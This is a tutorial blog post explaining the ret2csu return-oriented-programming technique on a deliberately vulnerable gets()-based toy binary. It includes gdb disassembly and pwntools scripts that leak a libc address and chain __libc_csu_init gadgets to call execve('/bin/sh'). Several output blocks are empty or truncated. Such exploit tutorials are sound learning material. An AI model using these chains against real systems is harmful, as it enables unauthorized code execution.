This is an in-depth guide on `ret2csu` technique. I tried to make this article as much detailed as I could, including references and some binary to practice it with.


# What is ret2csu?

Well, as you already know this a sub-technique of Return Oriented Programming. As you already know that Return Oriented Programming is the technique of using the available gadgets from the binary to craft a payload. The `ret2csu` technique involves the utilization of the gadgets present in `__libc_csu_init` to fill in the gaps of unavailable gadgets. For example, what if we want to do an `execve` syscall, we would need a `rdi` to pass `/bin/sh`, `rsi` for passing `0` and same for `rdx` and while looking for gadgets in binary, we didn't  find any `pop rdx; ret;`, then we use gadgets from `__libc_csu_init` to craft a chain carefully which will load the contents we gave to the `rdx`.

Confused? Don't worry, I'm gonna explain it in a very detailed way :)

# Prerequisites

This is included because, what if you're trying to understand it as a beginner, I included this section because this will help you recall the knowledge you need for performing a `ret2csu` attack. This includes the calling convention of `x86_64` bit binary and the assembly instructions we will deal with.

### Calling convetion

Calling convention refers to the way arguments are passed to a function, like how is the workflow of functions work at low level. Let's take an example program:-

```C
#include<stdio.h>

int main()
{
    int x = 1;
    char *s = "Hello World"; // :p
    float y = 0.12;
    printf("String: %s\nInteger: %d\nFloat: %f\n", s, x, y);
    return 0;
}
```

Let's compile it:-

```r
 ✘ d4mianwayne@oracle: /tmp $ cat sample.c
#include<stdio.h>

int main()
{
    int x = 1;
    char *s = "Hello World"; // :p
    double y = 100;
    printf("String: %s\nInteger: %d\Double: %lf\n", s, x, y);
    return 0;
}

 d4mianwayne@oracle: /tmp $ gcc sample.c -o sample
 d4mianwayne@oracle: /tmp $ ./sample 
String: Hello World
Integer: 1
Float: 100.000000
```

It works perfectly as it's supposed to Let's start gdb and start analyzing the binary workflow:-

```r
 d4mianwayne@oracle: /tmp $ gdb-gef -q sample

The `mov` lines are moving the variables from base pointers to registers. This is the basic instruction to move an address/value to other address/register.

> The line `0x000000000000064b <+1>:	mov    rbp,rsp`, this one moves the stack to the base pointer, this is because that way the program can easily retrieve the variables from the base pointer as they're stored at specific offsets.

Now, let's setup a breakpoint at `call printf` so that we can analyse how the arguments are being passed to it. GDB time:-

```r
gef➤  b *main + 74
Breakpoint 1 at 0x694
```

The breakpoint has been set, now let's run the program and analyze:-

Thanks to `gdb-gef`, we already know most of the things which we needed to know i.e. which register holds what value, but as we looking for the registers and we need to know what is happening since this is required for further learning.

Using `gdb`'s `x` command to analyze the memory and registers, we can see the following:-

```r
gef➤  x/s $rdi
0x555555554738:	"String: %s\nInteger: %d\nDouble: %lf\n"
gef➤  x/s $rsi
0x555555554728:	"Hello World"
gef➤  x/s $rdx
0x1:	<error: Cannot access memory at address 0x1>
gef➤  x/s $rcx
0x4059000000000000:	<error: Cannot access memory at address 0x4059000000000000>
gef➤  x/f $rcx
0x4059000000000000:	Cannot access memory at address 0x4059000000000000
gef➤  
```

Breaking it down:-

* `x555555554738:	"String: %s\nInteger: %d\nDouble: %lf\n"` : This is in register `rdi` which is passed as 1st argument to the `printf`.
* `0x555555554728:	"Hello World"` : This is in register `rsi` which is passed as 2nd argument to `printf`.
* `0x1:	<error: Cannot access memory at address 0x1>` : First, we got a **Cannot access memory** i.e. the `integer` which we printed has a value of `0x01`, hence a memory access error. This is passed to `rdx` register which is the 3rd argument to the `printf`.
* `0x4059000000000000:	Cannot access memory at address 0x4059000000000000` : Again, that happened because the value doesn't point to a valid address. This is the 4th argument which is passed to `printf`.

> You might be wondering why we got a value like `0x4059000000000000` while we assigned `100` to the variable. That happened because the `x/f` printed an aligned value which doesn't print the double values normally. For checking double values we do `gef➤  p/f $rcx - $1 = 100`.

From this we know how calling conventions works:-

* 1st argument goes to `rdi`.
* 2nd argument goest to `rsi`.
* 3rd argument goes to `rdx`
* 4th argument goes to `rcx`.

> This is constant for every function in 64 bit calling convention on Linux System.

### Assembly Instructions

Since we understood the calling conventions, it's time to take a look at the assembly instructions we will deal with to understand the workflow of the payload. As an example, let's take the exact same binary and analyse it's `__libc_csu_init`, starting with `gdb` again:-

```r
gef➤  disas __libc_csu_init
Dump of assembler code for function __libc_csu_init:

   0x00000000000006ed <+77>:	add    rbx,0x1
   0x00000000000006f1 <+81>:	cmp    rbp,rbx
   0x00000000000006f4 <+84>:	jne    0x6e0 <__libc_csu_init+64>
   0x00000000000006f6 <+86>:	add    rsp,0x8
   0x00000000000006fa <+90>:	pop    rbx
   0x00000000000006fb <+91>:	pop    rbp
   0x00000000000006fc <+92>:	pop    r12
   0x00000000000006fe <+94>:	pop    r13
   0x0000000000000700 <+96>:	pop    r14
   0x0000000000000702 <+98>:	pop    r15
   0x0000000000000704 <+100>:	ret    
```

Now, we see quite a lot of instructions, I'll explain it in one line since they're easy enough to get. 
> Note: I will only explain the instruction which we will need to understand.

* `lea` : This instruction **load effective address** to a register.
* `mov` : This instruction is used to move an address/value to a register.
* `je` : This is a conditional instruction which means **jump if equals to** executes depending on the result of previous instruction.
* `jle`: This is also a conditional instruction which means **jump if less than or equal to** depending on the result of previous instruction.
* `call` : This instruction calls a subroutine.
* `cmp` : This compares register with a register or a register with a value.
* `add` : This adds the value given at right operand to left operand and store in it.
* `pop` : This pop the register which is given as an operand and wait for a value/address to be given.
* `ret` : This shows that a subroutine or instruction has been completed.

Now, since we are way past the required knowledge section, it's time to understand stuff practically since Pwning is best explained practically. Let's take a piece of **vulnerable code** and compile it.

```C
#include <stdio.h>
#include <stdlib.h>


void vulnerable()
{
	char buf[30];
	gets(buf);          /* Well, duh? :p */
 }

int main()
{
 char name[20];
 puts("Welcome to the world of Pwning");
 puts("I'd like to know the name of brave warrior");
 fgets(name, 20, stdin);
 puts("As a token of appreciation, how about pwning me?");
 vulnerable();
 return 0;
}
```

Let's compile it by disabling the stack canary and PIE to make it more understandable. Using `gcc --no-stack-protector -no-pie chall.c -o chall`:-

```bash
 d4mianwayne@oracle: /tmp/ctf/pwn1 $ gcc --no-stack-protector -no-pie chall.c -o chall
chall.c: In function ‘vulnerable’:
chall.c:7:2: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
  gets(buf);          /* Well, duh? :p */
  ^~~~
  fgets
/tmp/ccr4ksWU.o: In function `vulnerable':
chall.c:(.text+0x15): warning: the `gets` function is dangerous and should not be used.
 d4mianwayne@oracle: /tmp/ctf/pwn1 $ ./chall
Welcome to the world of Pwning
I'd like to know the name of brave warrior
Robin
As a token of appreciation, how about pwning me?
Hello World
```
It works as it is supposed to, right?. But, our end goal is to get a shell or do something it is not supposed to. Let's fire up gdb and see what we have and start analyzing the binary :-

```r

```

As we have access to the source code, we pretty much know what exactly is going on. We need to find a way to get a shell and the `checksec` shows us we have a non-executable stack and `Partial Relro` which means GOT is overwritable but that's not the scope of this article, so we will keep it out.

We have access to `rdi`, `rsi` but **wait** we don't have `rdx`, (only if I added a `pop rdx; ret` instruction as well), that's where `ret2csu` comes in. We have access to plenty of other registers like `r12`, `r13`, `r14` and `r15` which if you thought is useless, you gonna check the hidden power and access they have. Since `ret2csu` deals with `__libc_csu_init`, why don't we check it's code and know about that function itself? Let's get started:-

Checking the disassembly of the `__libc_csu_init__` from the challenge binary:-

   0x0000000000400694 <+100>:	ret    
End of assembler dump.
```

It is not that long, so we can get this in a minute or two completely, though there's no point in understanding th whole workflow of the function so I'm going to take a look  over the instructions which will be useful.
Now, as you see the following lines:-

```r
   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
```

This seems interesting, the contents of `r13`, `r14` and `r15` are going in `edi`, `rsi` and `rdx` respectively. Remember, we had access to `r15` but not to `rdx` and the instruction at `__libc_csu_init + 64` can move the content of `r15` to `rdx`, that is the one we were looking for. But before start using these gadgets we need to understand what exactly is `__libc_csu_init` and it's usage.


---

### __libc_csu_init

The `__libc_csu_init` is found in every binary, the purpose of this function is for initialization of functions and variables such that our binary is ready to use. From the libc source code, we can see:-

```C
int __libc_csu_init(int argc, char **argv, char **envp)
{
    /*
     * Call all the __attribute__((constructor)) functions.
     * These symbols are generated by the linker.
     */
    size_t num_init = __init_array_end - __init_array_start; 
    for (size_t i = 0; i < num_init; i++) {
        __init_array_start[i](argc, argv, envp);
    }
}
```

In a nutshell, it calculates the difference between the `__init_array`'s start and end address which contains the functions, constructors, destructors, objects etc. which called at the time of initialization and hence, initialize them accordingly. I'm not covering much since the **journey of how main is called from a binary** would take it's own post, for now this is the knowledge we need.

---

Now, let's break down the process of creating an exploit and cover it one by one. Let's get started:-

### Finding offset to RIP

As usual, we need to know that exact how much bytes we need to give to the input in order to get the control of instruction pointer. Since we already used `gets`, we know that this program is vulnerable to buffer overflow, time to use `gdb-gef`'s `pattern` which will help us.

```r
gef➤  pattern create 200

```

Now, since we control over the RIP, time to use a `.bss` address to read string `/bin/sh` which we will be passed to first argument of `execve` later on.

### Storing `/bin/sh` at a `.bss` address

Since, we want to do `execve("/bin/sh", 0, 0)` but we don't have any memory which already have `/bin/sh` address, so what we gonna do is pick an address from `.bss` section and store the string at that particular address. Now, let's make a `pwntools` script to interact with binary and work with it, but firstly let's pick a `.bss` address with the help of `gdb`.

```r
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path

^C
Program received signal SIGINT, Interrupt.
[ Legend: Modified register | Code | Heap | Stack | String ]
```
Now, since we know that this binary contains a `rw-` data section, we will use it to store the `/bin/sh` at it. Let's start interacting with binary and send payload:-

```py
from pwn import *

elf = ELF("chall")
p = process("./chall")

payload = b"A"*40 # Offset to RIP
payload += p64(0x0400693) # `pop rdi; ret`
payload += p64(0x601150) # the `.bss` address`
payload += p64(elf.plt['gets']) # PLT address of `gets`
p.sendlineafter(b"warrior\n", "Robin")
pause() # This will allow the process to pause and then we debug it in `gdb`
p.sendlineafter(b"me?\n", payload) 
p.interactive()
```

> Payload: The `pop rdi; ret` will pop the `rdi` register and we gave the `.bss` address right after it, after that we added the PLT address of `gets`, that means we are just doing `gets(write_addr)`.

Let's run this script, after that we will attach it to `gdb` and check if the `/bin/sh` has been stored at that `.bss` address or not:-

```r

```

Let's `attach` this process to `gdb`:-

```r

```

Continuing the process, let's enter the `/bin/sh` string:-

```r

```

Well, back to `gdb`:-

```r
gef➤  
gef➤  c
Continuing.

### The `ret2csu` technique

We are finally at the main part of this blog post, this is where I will explain the technique very thoroughly, so be sure to pay attention. But, it is time for some code analysis of the gadgets we are going to use:-

```r
gef➤  disas __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   
   -- snip -- 

   0x0000000000400670 <+64>:	mov    rdx,r15

   0x0000000000400676 <+70>:	mov    edi,r13d
   0x0000000000400679 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040067d <+77>:	add    rbx,0x1
   0x0000000000400681 <+81>:	cmp    rbp,rbx
   0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>
   0x0000000000400686 <+86>:	add    rsp,0x8
   0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp

   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret    
End of assembler dump.
```

These are the instructions we are going to use, we have to break these gadgets in two parts so that we first fill up the registers like `r12`, `r13` and others and after that the `mov` instructions will move the contents to the register we want it to. Let's break the gadgets in **2** parts:-

```r
   0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp
   0x000000000040068c <+92>:	pop    r12
   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret   
```

This would be the first gadgets, first let's work on using these and we will move to the other gadgets:-

Since, `r15`'s content is going in `rdx`, `r14`'s content is going to `rsi` and `r13d`'s content is going to `rdi`. This means, we have to set the contents of these registers to `/bin/sh`, `0` and `0` respectively. Let's work on:-

> Note: The `d` in `r13d` means the `dword`.

The second ROP gadget:-

```r

   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
   0x0000000000400679 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040067d <+77>:	add    rbx,0x1
   0x0000000000400681 <+81>:	cmp    rbp,rbx
   0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>
   0x0000000000400686 <+86>:	add    rsp,0x8
   0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp
   0x000000000040068c <+92>:	pop    r12
   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret   
```

For the second part, the one which will transfer the contents of `r15`, `r14` and `r13` to `rdx`, `r14` to `rsi` and `r13` to `edi`. But there are some problems, the instructions after those `mov` instructions need to be handled carefully such that if any one of the values in register,  if wrong, would just discard everything. So, this is the important part, so focus on the explaination and work carefully.

Let's see how we will handle it, line by line:-

##### `call   QWORD PTR [r12+rbx*8]` 

This instruction calls a subroutine, now for this we may have to give up something which points to a function which is present in the binary and do not reference to an invalid address. To handle this, we will provide an address from Dynamic section of ELF such that the calling that function won't do any change to the register content, as it should preserve the state of these registers, it also should not point to any an arbitrary address which will cause a breakthrough in the binary workflow. To meet this requirements, we will need either a `_init` or `_fini` to preserve the state of register:-

```r
gef➤  x/5xg &_DYNAMIC
0x600e20:	0x0000000000000001	0x0000000000000001

   0x0000000000400486 <+22>:	ret    
End of assembler dump.
gef➤  

```

##### `0x000000000040067d <+77>:	add    rbx,0x1`

This will increment the value of value of `rbx` by `1`.

##### `0x0000000000400681 <+81>:	cmp    rbp,rbx`

This will compare the value of `rbp` with `rbx`.

##### `0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>`

This is a conditional jump, if the value of the `cmp rbp, rbx` is not equal, this means it'll jump to the instruction stored at `__libc_csu_init + 64`.

##### `0x0000000000400686 <+86>:	add    rsp,0x8`

This will add the `0x8` bytes and increase the size of the `rsp` by it.

### The ROP Chain: Explanation
Now, let's see exactly what is happening with the chain:-

```r
   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
   0x0000000000400679 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040067d <+77>:	add    rbx,0x1
   0x0000000000400681 <+81>:	cmp    rbp,rbx
   0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>
   0x0000000000400686 <+86>:	add    rsp,0x8
   0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp
   0x000000000040068c <+92>:	pop    r12
   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret  
```

Firstly, the lines with `mov` instruction are transferring the values of the registers of left operand to right operand. Then the `call` keyword is calling the subroutine calculated by at offset `r12 + rbx * 8`, and with the square brackets around them means the indirect addressing, this will make the `call` instruction to jump at that subroutine at the given address. Now, the `add rbx, 1` will increment the value of `rbx` by `1`. Then the value of `rbp` and `rbx` is compared, if they are not equal the RIP will be set to  `__libc_csu_init + 64`. If it is equal, then the stack size will be increased by 8 and the registers `rbx`, `rbp`, `r13`, `r14` and `r14` will be popped.

# Payload: Part 1

Now, since we are done with theoretical aspects of this technique, it's time to try it practically. What we gonna do here is, chain the ROP chain from which we were able to input `"/bin/sh"`, and we are going to leak a GOT address in order to calculate the LIBC base address, then we will call main again.

Let's build a ROP chain:-

Some prologue and predefined variables:-

```python
from pwn import *

elf = ELF("chall")
libc = elf.libc
p = process("./chall")
 
writable_address = 0x601150 # writale address
pop_rdi = 0x400693   # pop rdi; ret;
```
Enter the `/bin/sh` string to the wriitable address.

```python
payload = b"A"*40 # Padding to `RIP` register
payload += p64(pop_rdi) # The `pop rdi; ret;`, this will wait for input
payload += p64(writable_address) # The address is passed to `rdi` register
payload += p64(elf.plt['gets']) # This will call the `gets` with it's first argument as the writable address

'''
gets(writable_address);
'''
```
You know about what is happening here from earlier. Let's move to other:-

```python
payload += p64(pop_rdi) # This will pop the `rdi` register which will wait for contents to be loaded in. 
payload += p64(elf.got['puts']) # This `GOT` address of `puts` will be given to `rdi` register, hence the first argument of puts
payload += p64(elf.plt['puts']) # This will call `puts` with the `elf.got['puts']`
```

This part is doing a bit of what is happening with the above part, the differnce is `puts` will print the value provided as first argument, here the `GOT` address will point to the LIBC address of the function which means it'll print the address of `puts` from the LIBC.

Now, let's send the payload and parse the leaked LIBC address:-

```python
payload += p64(elf.symbols['main']) # This will shift the `RIP` to `main` function, hence calling the function again.
p.sendlineafter(b"warrior\n", "Robin") # This will be given to the first input program is asking for.
p.sendlineafter(b"me?\n", payload) # Now, we will send the payload.
p.sendline("/bin/sh\x00") # The `/bin/sh` string is being sent such that it'd be stored to the writable address.

leak = u64(p.recv(6).strip().ljust(8, b"\x00")) # Receiving the address and padding it such that it'll be 8 bytes. 

libc.address = leak - libc.symbols['puts'] # Subtracting the leaked address from the LIBC absolute address of `puts` will  give us the base address.
log.info("puts@libc : " + hex(leak)) # Printing the leaked address.
log.info("libc      : " + hex(libc.address)) # Printing the libc base address
log.info("'/bin/sh' : " + str(writable_address)) # Printing `/bin/sh` address.
```

Let's run the script and check it in `gdb` if we are on the right way or not:-

```r
d4mianwayne@oracle:~/pwn1$ python3 xpl.py

```

Now, attach it to `gdb`:-

```r

```

Let's continue the process with `continue`:-

```r
gef➤  continue
Continuing.

```

Now, resuming the script:-

```r

---

```r

This is printed because we called the `main` again.

---

Now, we will Interrupt the execution of program inside gdb to check if the address are correct:-

```r

Awesome! Everything seems to be right. Now, we will go through second payload:-

# Payload: Part 2

Now, this payload is crucial since this is where the actual `ret2csu` is, I'll try to explain as much as I can:-

```python

payload = b"A"*40 # Padding to `RIP` register
payload += p64(0x40068a) 

'''
0x000000000040068a <+90>:	pop    rbx
   0x000000000040068b <+91>:	pop    rbp
   0x000000000040068c <+92>:	pop    r12
   0x000000000040068e <+94>:	pop    r13
   0x0000000000400690 <+96>:	pop    r14
   0x0000000000400692 <+98>:	pop    r15
   0x0000000000400694 <+100>:	ret    

'''
payload += p64(0x00) # Passed to `rbx` register
payload += p64(0x01) # Passed to `rbp`
payload += p64(0x600e38) # Passed to `r12` 
payload += p64(writable_address) # Passed to `r13`
payload += p64(0x00) # Passed to `r14`
payload += p64(0x00) # Passed to `r15`

```

So, as you remember the following instructions:-

```r
   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
```

That's why we provided the value we wanted in `rdx`, `rsi` and `rdi` to `r15`, `r14` and `r13` respectively. The values passed to `rbx` and `rbp` have their importance when we call next chain. But first, let's run the script and attach it to gdb such that we can check content registers:-

```python
payload += p64(0x00) # Passed to `rbx` register
payload += p64(0x01) # Passed to `rbp`
payload += p64(0x600e38) # Passed to `r12` 
payload += p64(writable_address) # Passed to `r13`
payload += p64(0x00) # Passed to `r14`
payload += p64(0x00) # Passed to `r15`

p.sendlineafter(b"warrior\n", "Robin")
pause()
p.sendlineafter(b"me?\n", payload)
p.interactive()
```

Since, you already know the drill of attaching and continuing the process in `gdb`, I'll show the contents of registers:-

```r
gef➤  c
Continuing.

Now, it's time to check the second ROP chain:-

```python

   0x0000000000400673 <+67>:	mov    rsi,r14

payload += p64(0x00)            # add rsp,0x8 padding
payload += p64(0x00)            # rbx

payload += p64(libc.symbols['execve'])
```

Well, kind of a long chain to deal with but it's very simple, as I already explained it but this time we are giving the input, so this is a crucial part. The explanations would be done line by line:-

```r
   0x0000000000400670 <+64>:	mov    rdx,r15
   0x0000000000400673 <+67>:	mov    rsi,r14
   0x0000000000400676 <+70>:	mov    edi,r13d
   0x0000000000400679 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040067d <+77>:	add    rbx,0x1
   0x0000000000400681 <+81>:	cmp    rbp,rbx
   0x0000000000400684 <+84>:	jne    0x400670 <__libc_csu_init+64>
   0x0000000000400686 <+86>:	add    rsp,0x8
```

Now, the `mov` instructions will transfer the contents to registers. Previously, we gave `r12` : `0x600e38` which is an address to the `_init` pointer, here, apparently, `rbx` was `0` which means `[r12 + rbx * 8]` will be equal to `[0x600e38 + 0 * 8]` which will be `[0x600e38]`.  After that `rbx` is incremented by `0x1` which will make the `rbx` value `0x1`. Then the `cmp    rbp,rbx`, as you remember from the first chain, we provided `0x1` to `rbp` value, then it will evaluate equally since `rbp` and `rbx` both have the value of `0x1`, skipping the `jne` line. After that we have, `add rsp, 0x8`, we have to pad this instruction by giving `0x0`, after that we can give `0x0` to the popped registers as the control flow of program would take care of this.

# Pwned

As we are done understanding the payload, it's time to run the final script:-

Awesome, we did it. Congratulations, you finally made it to end which means you learned the `ret2csu` to some extent. I'd recommend you try it on yourself and mess around with `gdb`.
